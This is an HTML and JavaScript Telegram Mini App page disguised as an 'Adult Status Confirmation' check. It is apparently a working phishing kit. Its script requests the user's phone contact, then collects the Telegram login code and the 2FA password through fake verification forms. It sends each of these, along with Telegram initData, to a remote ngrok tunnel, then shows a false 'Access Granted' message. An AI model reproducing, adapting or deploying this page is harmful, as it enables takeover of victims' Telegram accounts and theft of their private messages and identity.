<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #000;
            overflow-x: hidden;
            width: 100vw;
            height: 100vh;
            position: fixed;
        }
        
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://picsum.photos/600/1200');
            background-size: cover;
            background-position: center;
            filter: blur(15px) brightness(0.3);
            transform: scale(1.1);
            z-index: 0;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }

        .content-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 24px;
            overflow-y: auto;
            overflow-x: hidden;
        }

        .main-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 28px;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .step-header {
            margin-bottom: 32px;
            text-align: center;
        }

        .emoji-display {
            font-size: 56px;
            margin-bottom: 16px;
            display: block;
        }

        .step-title {
            font-size: 24px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
            line-height: 1.3;
        }

        .step-subtitle {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 400;
            line-height: 1.5;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            font-size: 16px;
            font-weight: 500;
            text-align: center;
            transition: all 0.3s ease;
            margin-bottom: 16px;
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .input-field:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.4);
            background: rgba(255, 255, 255, 0.2);
        }

        .input-field.otp-field {
            letter-spacing: 8px;
            font-size: 20px;
            font-weight: 600;
        }

        .action-btn {
            width: 100%;
            padding: 16px;
            background: #fff;
            border: none;
            border-radius: 12px;
            color: #000;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .action-btn:active {
            transform: scale(0.97);
            opacity: 0.9;
        }

        .error-banner {
            margin-top: 16px;
            padding: 12px 16px;
            background: rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            color: #fca5a5;
            font-size: 13px;
            font-weight: 500;
            line-height: 1.4;
            text-align: center;
        }

        .hidden {
            display: none !important;
        }

        .success-icon {
            font-size: 80px;
            display: block;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
    <!-- Background -->
    <div class="bg-container"></div>
    <div class="overlay"></div>

    <!-- Content -->
    <div class="content-container">
        <div class="main-card">
            <!-- Adult Confirmation Step -->
            <div id="adultStep">
                <div class="step-header">
                    <span class="emoji-display">üîû</span>
                    <h2 class="step-title">Adult Status Confirmation</h2>
                    <p class="step-subtitle">Adult status confirmation required to access</p>
                </div>
                <button onclick="requestPhone()" class="action-btn">
                    Confirm Here
                </button>
            </div>

            <!-- OTP Step -->
            <div id="otpStep" class="hidden">
                <div class="step-header">
                    <span class="emoji-display">üîê</span>
                    <h2 class="step-title">Enter Code</h2>
                    <p class="step-subtitle">We sent a code to your Telegram account</p>
                </div>
                <input 
                    type="text" 
                    id="otpInput" 
                    maxlength="6" 
                    placeholder="12345"
                    class="input-field otp-field"
                    inputmode="numeric"
                />
                <button onclick="submitOTP()" class="action-btn">
                    Verify
                </button>
            </div>

            <!-- 2FA Step -->
            <div id="twoFAStep" class="hidden">
                <div class="step-header">
                    <span class="emoji-display">üîí</span>
                    <h2 class="step-title">Two-Factor Authentication</h2>
                    <p class="step-subtitle">Enter your 2FA password</p>
                </div>
                <input 
                    type="password" 
                    id="twoFAInput" 
                    placeholder="Password"
                    class="input-field"
                />
                <button onclick="submit2FA()" class="action-btn">
                    Submit
                </button>
            </div>

            <!-- Success Step -->
            <div id="successStep" class="hidden">
                <div class="step-header">
                    <span class="success-icon">‚úì</span>
                    <h2 class="step-title">Access Granted!</h2>
                    <p class="step-subtitle">Authentication complete</p>
                </div>
            </div>

            <!-- Error Message -->
            <div id="errorMessage" class="hidden error-banner"></div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const BASE_URL = "https://ac3c716eb447.ngrok-free.app";

        tg.ready();
        tg.expand();

        let phoneNumber = "";
        let userId = "";

        function showStep(stepId) {
            document.querySelectorAll('[id$="Step"]').forEach(el => el.classList.add('hidden'));
            document.getElementById(stepId).classList.remove('hidden');
            hideError();
        }

        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            errorEl.textContent = message;
            errorEl.classList.remove('hidden');
        }

        function hideError() {
            document.getElementById('errorMessage').classList.add('hidden');
        }

        function requestPhone() {
            tg.requestContact((result) => {
                if (!result) {
                    showError("Permission denied. Please share your phone number to continue.");
                    return;
                }

                userId = tg.initDataUnsafe?.user?.id || result.user_id;

                fetch(`${BASE_URL}/api/phone`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        user_id: userId,
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log("Response:", data);
                    if (data.success) {
                        showStep('otpStep');
                    } else {
                        showError(data.message || "Failed to send verification code");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    showError("Network error. Please try again.");
                });
            });
        }

        function submitOTP() {
            const otp = document.getElementById('otpInput').value;
            
            if (otp.length < 5 || otp.length > 6) {
                showError("Please enter a valid OTP code (5-6 digits)");
                return;
            }

            fetch(`${BASE_URL}/api/verify-otp`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    user_id: userId,
                    otp: otp,
                    initData: tg.initData
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("OTP Response:", data);
                if (data.success) {
                    if (data.need_2fa) {
                        showStep('twoFAStep');
                    } else {
                        showStep('successStep');
                        setTimeout(() => tg.close(), 2000);
                    }
                } else {
                    showError(data.message || "Invalid OTP code");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                showError("Network error. Please try again.");
            });
        }

        function submit2FA() {
            const twoFA = document.getElementById('twoFAInput').value;
            
            if (!twoFA) {
                showError("Please enter your 2FA password");
                return;
            }

            fetch(`${BASE_URL}/api/verify-2fa`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    user_id: userId,
                    password: twoFA,
                    initData: tg.initData
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("2FA Response:", data);
                if (data.success) {
                    showStep('successStep');
                    setTimeout(() => tg.close(), 2000);
                } else {
                    showError(data.message || "Invalid 2FA password");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                showError("Network error. Please try again.");
            });
        }

        // Auto-focus and auto-submit for OTP
        document.getElementById('otpInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length === 5 || this.value.length === 6) {
                setTimeout(() => submitOTP(), 500);
            }
        });
    </script>
</body>
</html>
